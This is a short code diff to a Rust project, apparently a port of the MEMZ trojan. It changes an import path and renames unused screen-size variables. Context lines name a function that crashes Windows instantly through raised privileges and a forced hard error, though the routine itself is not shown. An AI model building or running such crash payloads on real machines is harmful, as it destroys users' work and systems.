@@ -11,7 +11,7 @@ use memz_rs::{
         library::Library,
         ntdll_api::{NtRaiseHardErrorFn, RtlAdjustPrivilegeFn},
     },
-    payloads::system::msg_box_hook,
+    payloads::callback::msg_box_hook,
     utils::log,
     utils::log::{write_log, LogLocation, LogType},
     winapi_type::DWORD,
@@ -118,7 +118,7 @@ fn kill_windows_instant() -> Result<(), WinError> {
 
 fn main() -> Result<(), WinError> {
     log::new_log();
-    let (scrw, scrh) = (
+    let (_scrw, _scrh) = (
         wrap_get_system_metrics(SM_CXSCREEN)?,
         wrap_get_system_metrics(SM_CYSCREEN)?,
     );
